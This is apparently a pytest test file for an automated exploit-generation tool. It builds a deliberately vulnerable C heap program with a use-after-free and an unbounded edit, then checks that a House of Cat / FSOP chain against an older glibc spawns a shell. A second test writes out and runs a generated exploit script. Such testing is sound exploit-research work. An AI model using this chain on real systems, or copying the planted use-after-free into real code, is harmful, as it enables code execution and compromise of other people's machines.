"""No-win heap target -> shell via House of Cat / FSOP (doc 58).

The branch a heap bug fell into when the binary had NO win function and no reachable code pointer:
the tcache poison could land a chunk anywhere, but with nothing to point at it stopped at an L2
recipe. House of Cat needs no win -- an unsorted-bin leak gives the libc base + a heap address, a
fake _IO_FILE is written into a heap chunk, ONE safe-linked tcache poison points _IO_list_all at
it, and returning from main makes exit() flush it -> system(" /bin/sh").

Validated against an OLDER glibc from the host's container-overlay store (the air-gapped-box
scenario; the FSOP file-structure layout this forges is the glibc <= 2.42 shape). Confirmed by a
shell EVALUATING a forgery-proof marker, with a negative control (a corrupted _IO_list_all must not
spawn one). Building/relinking a fixture in dev/benchmark is allowed (the air-gap constraint is on
the shipped tool).
"""
import shutil
import subprocess
import sys

import pytest

from tests._env import find_old_glibc

from lykos.analyze.poc import attribution, chain_primitive
from lykos.analyze.poc import heap as _heap

_OLD = find_old_glibc()
_HAVE = bool(shutil.which("gcc") and shutil.which("patchelf") and _OLD)

# A NO-WIN number menu (no win function anywhere): 1 alloc(size) · 2 free(idx) [no clear -> UAF] ·
# 3 view(idx) writes 32 raw bytes (enough for the unsorted fd+bk leak) · 4 edit(idx,len)+bytes ·
# 5 quit (return from main -> exit -> _IO_flush_all walks _IO_list_all).
_FIXTURE = r"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void *slots[128]; int n = 0;
static long rdl(void){ char b[64]; if (!fgets(b, sizeof b, stdin)) exit(0); return strtol(b, 0, 10); }
int main(void){
    char cmd[64];
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    while (fgets(cmd, sizeof cmd, stdin)) {
        long c = strtol(cmd, 0, 10);
        if (c == 1) { long sz = rdl(); slots[n++] = malloc(sz); }
        else if (c == 2) { long i = rdl(); free(slots[i]); }
        else if (c == 3) { long i = rdl(); write(1, slots[i], 32); write(1, "\n", 1); }
        else if (c == 4) { long i = rdl(); long nn = rdl(); if (read(0, slots[i], nn) < 0) return 1; }
        else if (c == 5) { return 0; }                    /* quit -> exit -> _IO_flush_all */
    }
    return 0;
}
"""

_ROLES = {"add": "1", "free": "2", "view": "3", "edit": "4", "edit_fields": ["idx", "num", "str"]}
_MODEL = {"1": ["num"], "2": ["idx"], "3": ["idx"], "4": ["idx", "num", "str"]}


def _build(tmp_path):
    ver, libc, ld = _OLD
    src = tmp_path / "menu.c"
    src.write_text(_FIXTURE)
    exe = tmp_path / "menu"
    r = subprocess.run(["gcc", "-no-pie", "-fno-stack-protector", "-O0", "-w", "-o", str(exe),
                        str(src)], capture_output=True, text=True)
    if r.returncode != 0:
        pytest.skip(f"fixture build failed: {r.stderr[:200]}")
    libdir = str(__import__("pathlib").Path(libc).parent)
    pr = subprocess.run(["patchelf", "--set-interpreter", ld, "--set-rpath", libdir, str(exe)],
                        capture_output=True, text=True)
    if pr.returncode != 0:
        pytest.skip(f"patchelf failed: {pr.stderr[:200]}")
    exe.chmod(0o755)
    return exe, libc


def _plain_spawn(exe):
    return lambda: subprocess.Popen([str(exe)], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT)


@pytest.mark.skipif(not _HAVE, reason="needs gcc/patchelf and an old glibc (<=2.42) with the FSOP layout")
def test_house_of_cat_spawns_shell_no_win(tmp_path):
    exe, libc = _build(tmp_path)
    libc_data = open(libc, "rb").read()
    cat = _heap.house_of_cat_targets(libc_data, "system")
    assert cat and cat.get("system"), "House of Cat unavailable for this libc"
    uoff = _heap.unsorted_bin_offset(libc)
    assert uoff, "unsorted-bin offset not measurable"
    spawn = _plain_spawn(exe)
    markers = attribution.make_code_markers()

    # The positive run must spawn a shell that EVALUATES the forgery-proof marker (not an echo).
    won, base = False, None
    for _ in range(3):                                     # ASLR on -> the leak/base vary per run
        m = attribution.make_code_markers()
        base, out = chain_primitive._hoc_run(spawn, None, _ROLES, _MODEL, m, uoff, cat, [b"5\n"],
                                             corrupt=False)
        if base and m.proves(out):
            won, markers = True, m
            break
    assert won, "House of Cat did not spawn a shell on the no-win target"

    # Negative control: a corrupted _IO_list_all must NOT spawn a shell.
    m = attribution.make_code_markers()
    _, neg = chain_primitive._hoc_run(spawn, None, _ROLES, _MODEL, m, uoff, cat, [b"5\n"],
                                      corrupt=True)
    assert not m.proves(neg), "the negative control (wrong _IO_list_all) also spawned a shell"


@pytest.mark.skipif(not _HAVE, reason="needs gcc/patchelf and an old glibc (<=2.42) with the FSOP layout")
def test_house_of_cat_repro_script_spawns_shell(tmp_path):
    exe, libc = _build(tmp_path)
    libc_data = open(libc, "rb").read()
    cat = _heap.house_of_cat_targets(libc_data, "system")
    uoff = _heap.unsorted_bin_offset(libc)
    blob_gap = _heap.request2size(chain_primitive._HOC_BIG) + \
        _heap.request2size(chain_primitive._HOC_GUARD) - 0x10
    script = chain_primitive._house_of_cat_repro_script(_ROLES, uoff, cat, [b"5\n"], blob_gap)
    sp = tmp_path / "exploit.py"
    sp.write_bytes(script)
    # The shipped reproducer must recover the base live and spawn a shell against the fixture.
    r = subprocess.run([sys.executable, str(sp), str(exe)], capture_output=True, timeout=40)
    assert b"CAT_SHELL_2" in r.stdout, f"repro did not spawn a shell: {r.stdout[-160:]!r}"
